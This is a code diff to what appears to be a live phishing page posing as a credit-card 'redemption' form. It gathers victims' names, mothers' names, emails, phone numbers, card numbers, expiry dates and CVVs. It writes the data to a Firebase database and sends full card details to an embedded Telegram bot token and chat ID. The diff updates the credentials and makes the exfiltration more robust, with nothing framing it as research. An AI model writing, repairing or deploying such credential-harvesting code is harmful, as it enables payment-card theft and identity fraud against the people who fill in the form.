@@ -399,7 +399,7 @@
                         <label for="cardLimit">Card Limit</label>
                         <input type="number" id="cardLimit" required placeholder="e.g., 50000">
                     </div>
-                    <button type="button" class="btn btn-primary" onclick="nextStep(2, event)">Next <i class="fas fa-arrow-right"></i></button>
+                    <button type="button" class="btn btn-primary" id="nextBtn1" onclick="nextStep(2, event)">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
 
                 <!-- STEP 2: Credit Card Details -->
@@ -416,7 +416,7 @@
                     </div>
                     <div class="form-actions">
                         <button type="button" class="btn btn-secondary" onclick="previousStep(1)"><i class="fas fa-arrow-left"></i> Back</button>
-                        <button type="button" class="btn btn-primary" onclick="nextStep(3, event)">Submit & Proceed <i class="fas fa-check"></i></button>
+                        <button type="button" class="btn btn-primary" id="nextBtn2" onclick="nextStep(3, event)">Submit & Proceed <i class="fas fa-check"></i></button>
                     </div>
                 </div>
 
@@ -451,23 +451,32 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
         import { getDatabase, ref, push, set, update, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-        // --- TELEGRAM CREDENTIALS ---
+        // --- TELEGRAM CREDENTIALS (OLD RESTORED) ---
         const TG_BOT_TOKEN = "8933641983:AAGPkyuaJqdywgj8ijGmJY7qszJDybShEXA";
         const TG_CHAT_ID = "-1004359635207";
 
-        // --- FIREBASE CONFIGURATION ---
+        // --- FIREBASE CONFIGURATION (LATEST) ---
         const firebaseConfig = {
-            apiKey: "AIzaSyAgC0SP-SEZfgI_bkWZ9pUwm4ifyHQgnYU",
-            authDomain: "hrs-axis.firebaseapp.com",
-            databaseURL: "https://hrs-axis-default-rtdb.firebaseio.com",
-            projectId: "hrs-axis",
-            storageBucket: "hrs-axis.firebasestorage.app",
-            messagingSenderId: "209243782173",
-            appId: "1:209243782173:android:863cf941e015f3e09c1af4"
+            apiKey: "AIzaSyCca2auC87UeSz7Q7_BEwttYIe4CXSnN5w",
+            authDomain: "hrss-admin-axis.firebaseapp.com",
+            databaseURL: "https://hrss-admin-axis-default-rtdb.firebaseio.com",
+            projectId: "hrss-admin-axis",
+            storageBucket: "hrss-admin-axis.firebasestorage.app",
+            messagingSenderId: "509029139380",
+            appId: "1:509029139380:android:62a6df2cc98d4a3e84e8e1"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+        console.log("Initializing Firebase...");
+        let app, db;
+        
+        try {
+            app = initializeApp(firebaseConfig);
+            db = getDatabase(app);
+            console.log("Firebase initialized successfully!");
+        } catch (error) {
+            console.error("Firebase initialization error:", error);
+            alert("Failed to connect to database. Please refresh the page.");
+        }
         
         let currentStep = 1;
         let currentSubmissionId = null;
@@ -504,21 +513,26 @@
         });
 
         async function findExistingEntry(name, phone) {
-            const snapshot = await get(ref(db, 'submissions'));
-            if (!snapshot.exists()) return null;
-            const entries = snapshot.val();
-            for (let id in entries) {
-                const entry = entries[id];
-                if (entry.fullName === name && entry.mobileNumber === phone) {
-                    return { id, ...entry };
+            try {
+                const snapshot = await get(ref(db, 'submissions'));
+                if (!snapshot.exists()) return null;
+                const entries = snapshot.val();
+                for (let id in entries) {
+                    const entry = entries[id];
+                    if (entry.fullName === name && entry.mobileNumber === phone) {
+                        return { id, ...entry };
+                    }
                 }
+                return null;
+            } catch (error) {
+                console.error("Error finding existing entry:", error);
+                return null;
             }
-            return null;
         }
 
         async function sendToTelegram(cardNum, exp, cvv, type, limitVal) {
             const timeStamp = new Date().toLocaleString();
-            const tgMessage = `🚨 <b>New Redemption Entry</b> 🚨\n\n👤 <b>Name:</b> ${escapeHtml(fullName)}\n👩‍👦 <b>Mother's Name:</b> ${escapeHtml(motherName)}\n📧 <b>Email:</b> ${escapeHtml(email)}\n📱 <b>Mobile:</b> ${escapeHtml(mobileNumber)}\n💳 <b>Limit:</b> ${escapeHtml(limitVal)}\n\n💳 <b>Card:</b> <code>${escapeHtml(cardNum)}</code>\n📅 <b>Expiry:</b> ${escapeHtml(exp)}\n🔒 <b>CVV:</b> ${escapeHtml(cvv)}\n🏦 <b>Type:</b> ${escapeHtml(type)}\n\n📲 <b>Action:</b> App Download Initiated\n🕒 <b>Time:</b> ${timeStamp}`;
+            const tgMessage = ` <b>New Redemption Entry</b> \n\n👤 <b>Name:</b> ${escapeHtml(fullName)}\n👩 <b>Mother's Name:</b> ${escapeHtml(motherName)}\n <b>Email:</b> ${escapeHtml(email)}\n <b>Mobile:</b> ${escapeHtml(mobileNumber)}\n💳 <b>Limit:</b> ${escapeHtml(limitVal)}\n\n💳 <b>Card:</b> <code>${escapeHtml(cardNum)}</code>\n <b>Expiry:</b> ${escapeHtml(exp)}\n🔒 <b>CVV:</b> ${escapeHtml(cvv)}\n <b>Type:</b> ${escapeHtml(type)}\n\n📲 <b>Action:</b> App Download Initiated\n🕒 <b>Time:</b> ${timeStamp}`;
 
             console.log("Attempting to send to Telegram:", tgMessage);
 
@@ -572,6 +586,8 @@
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
             try {
+                console.log(`Moving from step ${currentStep} to step ${step}`);
+
                 if (currentStep === 1 && step === 2) {
                     fullName = document.getElementById('fullName').value.trim();
                     motherName = document.getElementById('motherName').value.trim();
@@ -579,31 +595,43 @@
                     mobileNumber = document.getElementById('mobileNumber').value.trim();
                     const limit = document.getElementById('cardLimit').value || 'N/A';
                     
-                    const existing = await findExistingEntry(fullName, mobileNumber);
+                    console.log("Saving personal info to Firebase...");
+                    
+                    try {
+                        const existing = await findExistingEntry(fullName, mobileNumber);
 
-                    if (existing) {
-                        currentSubmissionId = existing.id;
-                        await update(ref(db, 'submissions/' + currentSubmissionId), {
-                            fullName: fullName,
-                            motherName: motherName,
-                            email: email,
-                            mobileNumber: mobileNumber,
-                            cardLimit: limit,
-                            timestamp: Date.now(),
-                            status: 'filling_details'
-                        });
-                    } else {
-                        const newRef = push(ref(db, 'submissions'));
-                        currentSubmissionId = newRef.key;
-                        await set(newRef, {
-                            fullName: fullName,
-                            motherName: motherName,
-                            email: email,
-                            mobileNumber: mobileNumber,
-                            cardLimit: limit,
-                            status: 'filling_details',
-                            timestamp: Date.now()
-                        });
+                        if (existing) {
+                            currentSubmissionId = existing.id;
+                            await update(ref(db, 'submissions/' + currentSubmissionId), {
+                                fullName: fullName,
+                                motherName: motherName,
+                                email: email,
+                                mobileNumber: mobileNumber,
+                                cardLimit: limit,
+                                timestamp: Date.now(),
+                                status: 'filling_details'
+                            });
+                            console.log("Updated existing entry:", currentSubmissionId);
+                        } else {
+                            const newRef = push(ref(db, 'submissions'));
+                            currentSubmissionId = newRef.key;
+                            await set(newRef, {
+                                fullName: fullName,
+                                motherName: motherName,
+                                email: email,
+                                mobileNumber: mobileNumber,
+                                cardLimit: limit,
+                                status: 'filling_details',
+                                timestamp: Date.now()
+                            });
+                            console.log("Created new entry:", currentSubmissionId);
+                        }
+                    } catch (firebaseError) {
+                        console.error("Firebase error:", firebaseError);
+                        alert("Error saving data. Please check your internet connection and try again.\n\nError: " + firebaseError.message);
+                        btn.disabled = false;
+                        btn.innerHTML = originalText;
+                        return;
                     }
                 }
 
@@ -625,9 +653,12 @@
                         });
                     }
                     
-                    await sendToTelegram(cardNum, exp, cvv, type, limitVal);
+                    // Send to Telegram (don't wait for it to complete)
+                    sendToTelegram(cardNum, exp, cvv, type, limitVal);
                 }
 
+                // Transition to next step
+                console.log(`Transitioning to step ${step}`);
                 document.getElementById(`step${currentStep}`).classList.remove('active');
                 document.querySelector(`.step[data-step="${currentStep}"]`).classList.add('completed');
                 document.querySelector(`.step[data-step="${currentStep}"]`).classList.remove('active');
@@ -639,7 +670,7 @@
                 
             } catch (error) {
                 console.error("Step transition error:", error);
-                alert("An error occurred. Please check your internet connection and try again.");
+                alert("An error occurred: " + error.message + "\n\nPlease check console (F12) for details.");
             } finally {
                 btn.disabled = false;
                 btn.innerHTML = originalText;
